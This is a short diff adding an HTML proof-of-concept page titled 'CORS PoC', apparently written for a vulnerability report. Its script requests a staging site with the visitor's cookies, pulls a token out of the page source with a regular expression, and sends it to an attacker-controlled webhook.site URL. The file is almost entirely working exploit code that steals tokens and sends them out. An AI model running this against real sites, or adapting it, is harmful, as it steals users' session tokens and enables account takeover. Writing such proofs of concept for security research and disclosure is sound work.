@@ -1,0 +1,23 @@
+<!DOCTYPE html>
+<html>
+<body>
+<h1>CORS PoC</h1>
+<script>
+// Fetch the vulnerable site with victim’s cookies
+fetch("https://app.stg01.sealdocs.com/", { credentials: "include" })
+.then(res => res.text())
+.then(html => {
+// Extract token from page source
+const match = html.match(/'token':\s*'([a-f0-9]+)'/);
+if (match) {
+const token = match[1];
+console.log("Extracted token:", token);
+
+// Send it to attacker-controlled server
+fetch("https://webhook.site/aec17e09-19e5-4678-bcca-4cb04471926c?token=" + token);
+}
+})
+.catch(err => console.error("Request failed:", err));
+</script>
+</body>
+</html>
